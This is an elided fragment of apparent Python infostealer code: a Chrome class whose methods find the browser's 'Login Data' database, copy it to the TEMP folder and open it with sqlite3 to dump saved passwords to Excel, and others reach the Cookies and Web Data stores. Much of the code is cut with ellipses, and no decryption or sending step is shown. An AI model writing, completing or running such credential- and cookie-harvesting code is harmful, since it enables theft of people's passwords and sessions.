...
class Chrome:
    ...
    def chrome_passwords_to_excel(self):
        try:
            login_db = login_db = self.get_file_path("Login Data")
            if login_db:
                login_db_copy = os.getenv("TEMP") + "\\Login.db"
                shutil.copy2(login_db, login_db_copy)
                conn = sqlite3.connect(login_db_copy)
    ...
    def cookies(self):
        try:
            if self.get_installed_browsers():
                cookies_db = self.get_file_path("Cookies")
                if cookies_db:
                    ...
                    return None
            else: return "Chrome browsers is not installed!!!!!"
        except Exception as e:
            return e
    ...
    def web_data(self):
        try:
            if self.get_installed_browsers():
                web_data_db = self.get_file_path("Web Data")
                if web_data_db:
...
# print(browser.get_file_path("History"))
